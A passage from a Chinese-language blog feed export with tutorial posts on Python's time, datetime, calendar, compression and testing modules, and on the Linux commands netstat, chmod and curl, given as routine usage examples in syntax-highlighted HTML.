punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token comment"># 2021-09-26</span><span class="token keyword">print</span><span class="token punctuation">(</span>now<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%m-%d-%y. %d %b %Y is a %A on the %d day of %B."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 09-26-21. 26 Sep 2021 is a Sunday on the 26 day of September.</span><span class="token comment"># dates support calendar arithmetic</span>birthday <span class="token operator">=</span> date<span class="token punctuation">(</span><span class="token number">1964</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span>age <span class="token operator">=</span> now <span class="token operator">-</span> birthday<span class="token keyword">print</span><span class="token punctuation">(</span>age<span class="token punctuation">.</span>days<span class="token punctuation">)</span><span class="token comment"># 20876</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据压缩"><a href="#数据压缩" class="headerlink" title="数据压缩"></a>数据压缩</h3><p>以下模块直接支持通用的数据打包和压缩格式：zlib，gzip，bz2，zipfile，以及 tarfile</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zlibs <span class="token operator">=</span> <span class="token string">b'witch which has which witches wrist watch'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 41</span>t <span class="token operator">=</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 37</span><span class="token keyword">print</span><span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'witch which has which witches wrist watch'</span><span class="token keyword">print</span><span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 226805979</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="性能度量"><a href="#性能度量" class="headerlink" title="性能度量"></a>性能度量</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> timeit <span class="token keyword">import</span> Timer<span class="token keyword">print</span><span class="token punctuation">(</span>Timer<span class="token punctuation">(</span><span class="token string">'t=a; a=b; b=t'</span><span class="token punctuation">,</span> <span class="token string">'a=1; b=2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>timeit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 0.032305799999999996</span><span class="token keyword">print</span><span class="token punctuation">(</span>Timer<span class="token punctuation">(</span><span class="token string">'a,b = b,a'</span><span class="token punctuation">,</span> <span class="token string">'a=1; b=2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>timeit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 0.025154800000000005</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="测试模块"><a href="#测试模块" class="headerlink" title="测试模块"></a>测试模块</h3><p>doctest模块提供了一个工具，扫描模块并根据程序中内嵌的文档字符串执行测试</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">average</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Computes the arithmetic mean of a list of numbers.    &gt;&gt;&gt; print(average([20, 30, 70]))    40.0    """</span>    <span class="token keyword">return</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token builtin">len</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token keyword">import</span> doctestdoctest<span class="token punctuation">.</span>testmod<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment"># 自动验证嵌入测试</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>unittest模块不像 doctest模块那么容易使用，不过它可以在一个独立的文件里提供一个更全面的测试集</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> unittest<span class="token keyword">class</span> <span class="token class-name">TestStatisticalFunctions</span><span class="token punctuation">(</span>unittest<span class="token punctuation">.</span>TestCase<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">test_average</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>assertEqual<span class="token punctuation">(</span>average<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">40.0</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>assertEqual<span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>average<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4.3</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>assertRaises<span class="token punctuation">(</span>ZeroDivisionError<span class="token punctuation">,</span> average<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>assertRaises<span class="token punctuation">(</span>TypeError<span class="token punctuation">,</span> average<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span>unittest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># Calling from the command line invokes all tests</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="时间和日期"><a href="#时间和日期" class="headerlink" title="时间和日期"></a>时间和日期</h2><ol><li>每个时间戳都以自从1970年1月1日午夜（历元）经过了多长时间来表示</li><li>时间间隔是以秒为单位的浮点小数</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time  <span class="token comment"># 引入time模块</span>ticks <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"当前时间戳为:"</span><span class="token punctuation">,</span> ticks<span class="token punctuation">)</span><span class="token comment"># 当前时间戳为: 1632676717.5455847</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="时间元组"><a href="#时间元组" class="headerlink" title="时间元组"></a>时间元组</h3><table><thead><tr><th align="left">序号</th><th>字段</th><th align="left">属性</th><th align="left">值</th></tr></thead><tbody><tr><td align="left">0</td><td>4位数年</td><td align="left">tm_year</td><td align="left">2008</td></tr><tr><td align="left">1</td><td>月</td><td align="left">tm_mon</td><td align="left">1 到 12</td></tr><tr><td align="left">2</td><td>日</td><td align="left">tm_mday</td><td align="left">1 到 31</td></tr><tr><td align="left">3</td><td>小时</td><td align="left">tm_hour</td><td align="left">0 到 23</td></tr><tr><td align="left">4</td><td>分钟</td><td align="left">tm_min</td><td align="left">0 到 59</td></tr><tr><td align="left">5</td><td>秒</td><td align="left">tm_sec</td><td align="left">0 到 61 (60或61 是闰秒)</td></tr><tr><td align="left">6</td><td>一周的第几日</td><td align="left">tm_wday</td><td align="left">0到6 (0是周一)</td></tr><tr><td align="left">7</td><td>一年的第几日</td><td align="left">tm_yday</td><td align="left">1 到 366(儒略历)</td></tr><tr><td align="left">8</td><td>夏令时</td><td align="left">tm_isdst</td><td align="left">-1, 0, 1, -1是决定是否为夏令时的旗帜</td></tr></tbody></table><h3 id="获取当前时间"><a href="#获取当前时间" class="headerlink" title="获取当前时间"></a>获取当前时间</h3><p>从返回浮点数的时间戳方式向时间元组转换，只要将浮点数传递给如localtime之类的函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> timelocaltime <span class="token operator">=</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"本地时间为 :"</span><span class="token punctuation">,</span> localtime<span class="token punctuation">)</span><span class="token comment"># 本地时间为 : time.struct_time(tm_year=2021, tm_mon=9, tm_mday=27, tm_hour=1, tm_min=24, tm_sec=5, tm_wday=0, tm_yday=270, tm_isdst=0)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="获取格式化的时间"><a href="#获取格式化的时间" class="headerlink" title="获取格式化的时间"></a>获取格式化的时间</h3><p>获取可读的时间模式的函数是asctime()</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> timelocaltime <span class="token operator">=</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"本地时间为 :"</span><span class="token punctuation">,</span> localtime<span class="token punctuation">)</span><span class="token comment"># 本地时间为 : Mon Sep 27 01:25:32 2021</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="格式化日期"><a href="#格式化日期" class="headerlink" title="格式化日期"></a>格式化日期</h3><p>time 模块的 strftime 方法来格式化日期</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">[</span><span class="token punctuation">,</span> t<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token comment"># 格式化成2016-03-20 11:45:39形式</span><span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d %H:%M:%S"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 格式化成Sat Mar 28 22:24:24 2016形式</span><span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%a %b %d %H:%M:%S %Y"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 将格式字符串转换为时间戳</span>a <span class="token operator">=</span> <span class="token string">"Sat Mar 28 22:24:24 2016"</span><span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>mktime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">"%a %b %d %H:%M:%S %Y"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''2021-09-27 01:28:18Mon Sep 27 01:28:18 20211459175064.0'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python中时间日期格式化符号</p><ul><li>%y 两位数的年份表示（00-99）</li><li>%Y 四位数的年份表示（000-9999）</li><li>%m 月份（01-12）</li><li>%d 月内中的一天（0-31）</li><li>%H 24小时制小时数（0-23）</li><li>%I 12小时制小时数（01-12）</li><li>%M 分钟数（00-59）</li><li>%S 秒（00-59）</li><li>%a 本地简化星期名称</li><li>%A 本地完整星期名称</li><li>%b 本地简化的月份名称</li><li>%B 本地完整的月份名称</li><li>%c 本地相应的日期表示和时间表示</li><li>%j 年内的一天（001-366）</li><li>%p 本地A.M.或P.M.的等价符</li><li>%U 一年中的星期数（00-53）星期天为星期的开始</li><li>%w 星期（0-6），星期天为星期的开始</li><li>%W 一年中的星期数（00-53）星期一为星期的开始</li><li>%x 本地相应的日期表示</li><li>%X 本地相应的时间表示</li><li>%Z 当前时区的名称</li><li>%% %号本身</li></ul><h3 id="获取某月日历"><a href="#获取某月日历" class="headerlink" title="获取某月日历"></a>获取某月日历</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> calendarcal <span class="token operator">=</span> calendar<span class="token punctuation">.</span>month<span class="token punctuation">(</span><span class="token number">2016</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"以下输出2016年1月份的日历:"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''以下输出2016年1月份的日历:    January 2016Mo Tu We Th Fr Sa Su             1  2  3 4  5  6  7  8  9 1011 12 13 14 15 16 1718 19 20 21 22 23 2425 26 27 28 29 30 31'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Time-模块"><a href="#Time-模块" class="headerlink" title="Time 模块"></a>Time 模块</h3><p>Time 模块包含了以下内置函数，既有时间处理的，也有转换时间格式的</p><table><thead><tr><th align="left">序号</th><th align="left">函数及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python/att-time-altzone.html">time.altzone</a> 返回格林威治西部的夏令时地区的偏移秒数。如果该地区在格林威治东部会返回负值（如西欧，包括英国）。对夏令时启用地区才能使用。</td></tr><tr><td align="left">2</td><td align="left">[time.asctime(<a href="https://www.runoob.com/python/att-time-asctime.html">tupletime])</a> 接受时间元组并返回一个可读的形式为”Tue Dec 11 18:07:14 2008”（2008年12月11日 周二18时07分14秒）的24个字符的字符串。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python/att-time-clock.html">time.clock( )</a> 用以浮点数计算的秒数返回当前的CPU时间。用来衡量不同程序的耗时，比time.time()更有用。</td></tr><tr><td align="left">4</td><td align="left">[time.ctime(<a href="https://www.runoob.com/python/att-time-ctime.html">secs])</a> 作用相当于asctime(localtime(secs))，未给参数相当于asctime()</td></tr><tr><td align="left">5</td><td align="left">[time.gmtime(<a href="https://www.runoob.com/python/att-time-gmtime.html">secs])</a> 接收时间戳（1970纪元后经过的浮点秒数）并返回格林威治天文时间下的时间元组t。注：t.tm_isdst始终为0</td></tr><tr><td align="left">6</td><td align="left">[time.localtime(<a href="https://www.runoob.com/python/att-time-localtime.html">secs])</a> 接收时间戳（1970纪元后经过的浮点秒数）并返回当地时间下的时间元组t（t.tm_isdst可取0或1，取决于当地当时是不是夏令时）。</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python/att-time-mktime.html">time.mktime(tupletime)</a> 接受时间元组并返回时间戳（1970纪元后经过的浮点秒数）。</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python/att-time-sleep.html">time.sleep(secs)</a> 推迟调用线程的运行，secs指秒数。</td></tr><tr><td align="left">9</td><td align="left">[time.strftime(fmt<a href="https://www.runoob.com/python/att-time-strftime.html">,tupletime])</a> 接收以时间元组，并返回以可读字符串表示的当地时间，格式由fmt决定。</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python/att-time-strptime.html">time.strptime(str,fmt=’%a %b %d %H:%M:%S %Y’)</a> 根据fmt的格式把一个时间字符串解析为时间元组。</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python/att-time-time.html">time.time( )</a> 返回当前时间的时间戳（1970纪元后经过的浮点秒数）。</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python/att-time-tzset.html">time.tzset()</a> 根据环境变量TZ重新初始化时间相关设置。</td></tr></tbody></table><p>Time模块包含了以下2个非常重要的属性：</p><table><thead><tr><th align="left">序号</th><th align="left">属性及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>time.timezone</strong> 属性 time.timezone 是当地时区（未启动夏令时）距离格林威治的偏移秒数（&gt;0，美洲&lt;=0大部分欧洲，亚洲，非洲）。</td></tr><tr><td align="left">2</td><td align="left"><strong>time.tzname</strong> 属性time.tzname包含一对根据情况的不同而不同的字符串，分别是带夏令时的本地时区名称，和不带的。</td></tr></tbody></table><h3 id="日历（Calendar）模块"><a href="#日历（Calendar）模块" class="headerlink" title="日历（Calendar）模块"></a>日历（Calendar）模块</h3><p>此模块的函数都是日历相关的，例如打印某月的字符月历。</p><p>星期一是默认的每周第一天，星期天是默认的最后一天。更改设置需调用calendar.setfirstweekday()函数。模块包含了以下内置函数</p><table><thead><tr><th align="left">序号</th><th align="left">函数及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>calendar.calendar(year,w=2,l=1,c=6)</strong> 返回一个多行字符串格式的year年年历，3个月一行，间隔距离为c。 每日宽度间隔为w字符。每行长度为21* W+18+2* C。l是每星期行数。</td></tr><tr><td align="left">2</td><td align="left"><strong>calendar.firstweekday( )</strong> 返回当前每周起始日期的设置。默认情况下，首次载入 calendar 模块时返回 0，即星期一。</td></tr><tr><td align="left">3</td><td align="left"><strong>calendar.isleap(year)</strong> 是闰年返回 True，否则为 False。<code>&gt;&gt;&gt; import calendar &gt;&gt;&gt; print(calendar.isleap(2000)) True &gt;&gt;&gt; print(calendar.isleap(1900)) False</code></td></tr><tr><td align="left">4</td><td align="left"><strong>calendar.leapdays(y1,y2)</strong> 返回在Y1，Y2两年之间的闰年总数。</td></tr><tr><td align="left">5</td><td align="left"><strong>calendar.month(year,month,w=2,l=1)</strong> 返回一个多行字符串格式的year年month月日历，两行标题，一周一行。每日宽度间隔为w字符。每行的长度为7* w+6。l是每星期的行数。</td></tr><tr><td align="left">6</td><td align="left"><strong>calendar.monthcalendar(year,month)</strong> 返回一个整数的单层嵌套列表。每个子列表装载代表一个星期的整数。Year年month月外的日期都设为0;范围内的日子都由该月第几日表示，从1开始。</td></tr><tr><td align="left">7</td><td align="left"><strong>calendar.monthrange(year,month)</strong> 返回两个整数。第一个是该月的星期几的日期码，第二个是该月的日期码。日从0（星期一）到6（星期日）;月从1到12。</td></tr><tr><td align="left">8</td><td align="left"><strong>calendar.prcal(year,w=2,l=1,c=6)</strong> 相当于 **print calendar.calendar(year,w=2,l=1,c=6)**。</td></tr><tr><td align="left">9</td><td align="left"><strong>calendar.prmonth(year,month,w=2,l=1)</strong> 相当于 <strong>print calendar.month(year,month,w=2,l=1)</strong> 。</td></tr><tr><td align="left">10</td><td align="left"><strong>calendar.setfirstweekday(weekday)</strong> 设置每周的起始日期码。0（星期一）到6（星期日）。</td></tr><tr><td align="left">11</td><td align="left"><strong>calendar.timegm(tupletime)</strong> 和time.gmtime相反：接受一个时间元组形式，返回该时刻的时间戳（1970纪元后经过的浮点秒数）。</td></tr><tr><td align="left">12</td><td align="left"><strong>calendar.weekday(year,month,day)</strong> 返回给定日期的日期码。0（星期一）到6（星期日）。月份为 1（一月） 到 12（12月）。</td></tr></tbody></table><p>待更新</p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux命令</title>
      <link href="/2021/09/08/linux-ming-ling/"/>
      <url>/2021/09/08/linux-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h1><h2 id="netstat-查看Linux中网络系统状态信息"><a href="#netstat-查看Linux中网络系统状态信息" class="headerlink" title="netstat-查看Linux中网络系统状态信息"></a>netstat-查看Linux中网络系统状态信息</h2><p>选项</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-a或--all：显示所有连线中的Socket；-A<span class="token operator">&lt;</span>网络类型<span class="token operator">&gt;</span>或--<span class="token operator">&lt;</span>网络类型<span class="token operator">&gt;</span>：列出该网络类型连线中的相关地址；-c或--continuous：持续列出网络状态；-C或--cache：显示路由器配置的快取信息；-e或--extend：显示网络其他相关信息；-F或--fib：显示FIB；-g或--groups：显示多重广播功能群组组员名单；-h或--help：在线帮助；-i或--interfaces：显示网络界面信息表单；-l或--listening：显示监控中的服务器的Socket；-M或--masquerade：显示伪装的网络连线；-n或--numeric：直接使用ip地址，而不通过域名服务器；-N或--netlink或--symbolic：显示网络硬件外围设备的符号连接名称；-o或--timers：显示计时器；-p或--programs：显示正在使用Socket的程序识别码和程序名称；-r或--route：显示Routing Table；-s或--statistice：显示网络工作信息统计表；-t或--tcp：显示TCP传输协议的连线状况；-u或--udp：显示UDP传输协议的连线状况；-v或--verbose：显示指令执行过程；-V或--version：显示版本信息；-w或--raw：显示RAW传输协议的连线状况；-x或--unix：此参数的效果和指定<span class="token string">"-A unix"</span>参数相同；--ip或--inet：此参数的效果和指定<span class="token string">"-A inet"</span>参数相同。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h2><p><code>chmod</code> 命令在 Unix 和类 Unix 操作系统中用于更改文件和目录的权限。</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p><code>chmod</code> 命令的一般语法是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> 模式 文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>模式</strong>：指定要设置的权限。</li><li><strong>文件</strong>：指定要更改权限的文件或目录。</li></ul><h3 id="权限表示"><a href="#权限表示" class="headerlink" title="权限表示"></a>权限表示</h3><p>权限可以用符号或数字来表示。</p><h3 id="符号表示"><a href="#符号表示" class="headerlink" title="符号表示"></a>符号表示</h3><p>权限由三组三个字符表示：</p><ul><li>第一组字符是文件所有者（用户）的权限。</li><li>第二组字符是文件所有者所属组的权限。</li><li>第三组字符是其他用户的权限。</li></ul><p>每组可以有以下字符：</p><ul><li><code>r</code>（读）</li><li><code>w</code>（写）</li><li><code>x</code>（执行）</li></ul><p>例如：</p><ul><li><code>rwxr-xr--</code> 表示文件所有者有读、写、执行权限；组有读、执行权限；其他用户只有读权限。</li></ul><h3 id="数字表示"><a href="#数字表示" class="headerlink" title="数字表示"></a>数字表示</h3><p>权限也可以用八进制（base-8）数字表示：</p><ul><li>读由 <code>4</code> 表示。</li><li>写由 <code>2</code> 表示。</li><li>执行由 <code>1</code> 表示。</li></ul><p>权限的总和表示最终权限：</p><ul><li><code>7</code>（读 + 写 + 执行）</li><li><code>6</code>（读 + 写）</li><li><code>5</code>（读 + 执行）</li><li><code>4</code>（只有读）</li><li><code>0</code>（没有权限）</li></ul><p>例如：</p><ul><li><code>755</code> 表示文件所有者有 <code>7</code>（读、写、执行），组有 <code>5</code>（读、执行），其他用户有 <code>5</code>（读、执行）。</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><ol><li><p><strong>符号表示更改权限：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> u+x file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>给 <code>file.txt</code> 的所有者添加执行权限。</p></li><li><p><strong>数字表示更改权限：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">644</span> file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置 <code>file.txt</code> 的所有者有读和写权限，组和其他用户只有读权限。</p></li><li><p><strong>递归更改权限：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token parameter variable">-R</span> <span class="token number">755</span> /path/to/directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置 <code>/path/to/directory</code> 内所有文件和目录的权限。</p></li></ol><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><ul><li><code>-R</code>：递归更改文件和目录的权限。</li><li><code>-v</code>：详细模式。对每个处理的文件输出诊断信息。</li><li><code>-c</code>：类似详细模式，但仅在更改时报告。</li></ul><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p><code>curl</code> 是一个非常强大的命令行工具，用于从命令行传输数据。它支持多种协议，如 HTTP, HTTPS, FTP, 和 SMTP。你可以用它来发送 GET 请求、POST 请求、下载文件，甚至与 API 交互。以下是 <code>curl</code> 的一些基本用法示例。</p><h3 id="1-基本用法"><a href="#1-基本用法" class="headerlink" title="1. 基本用法"></a>1. 基本用法</h3><p>最简单的 <code>curl</code> 用法就是发送一个 GET 请求并输出响应内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会在终端中显示 <code>http://example.com</code> 的网页内容。</p><h3 id="2-保存响应到文件"><a href="#2-保存响应到文件" class="headerlink" title="2. 保存响应到文件"></a>2. 保存响应到文件</h3><p>使用 <code>-o</code> 选项可以将响应保存到文件中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-o</span> example.html http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会将 <code>example.com</code> 的内容保存到 <code>example.html</code> 文件中。</p><h3 id="3-发送-POST-请求"><a href="#3-发送-POST-请求" class="headerlink" title="3. 发送 POST 请求"></a>3. 发送 POST 请求</h3><p>你可以使用 <code>-d</code> 选项发送 POST 请求。以下是一个发送表单数据的例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-d</span> <span class="token string">"name=John&amp;age=30"</span> <span class="token parameter variable">-X</span> POST http://example.com/post<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>-X</code> 选项用于指定请求方法。在这里，我们明确指定为 POST 请求。</p><h3 id="4-使用自定义请求头"><a href="#4-使用自定义请求头" class="headerlink" title="4. 使用自定义请求头"></a>4. 使用自定义请求头</h3><p>你可以使用 <code>-H</code> 选项添加自定义请求头：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer your_token_here"</span> http://example.com/secure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这在访问需要认证的 API 时非常有用。</p><h3 id="5-下载文件"><a href="#5-下载文件" class="headerlink" title="5. 下载文件"></a>5. 下载文件</h3><p>使用 <code>-O</code> 选项可以直接下载文件，并保留文件的原始名称：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-O</span> http://example.com/file.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会将 <code>file.zip</code> 下载到当前目录。</p><h3 id="6-处理重定向"><a href="#6-处理重定向" class="headerlink" title="6. 处理重定向"></a>6. 处理重定向</h3><p>默认情况下，<code>curl</code> 不会跟随重定向。你可以使用 <code>-L</code> 选项让它跟随重定向：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-L</span> http://short.url<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会跟随重定向到最终的 URL 并获取内容。</p><h3 id="7-显示详细信息"><a href="#7-显示详细信息" class="headerlink" title="7. 显示详细信息"></a>7. 显示详细信息</h3><p>如果你想查看请求和响应的详细信息，可以使用 <code>-v</code> 选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会显示所有请求头、响应头以及其它调试信息。</p><h3 id="8-使用代理"><a href="#8-使用代理" class="headerlink" title="8. 使用代理"></a>8. 使用代理</h3><p>如果你需要通过代理访问网络资源，可以使用 <code>-x</code> 选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter 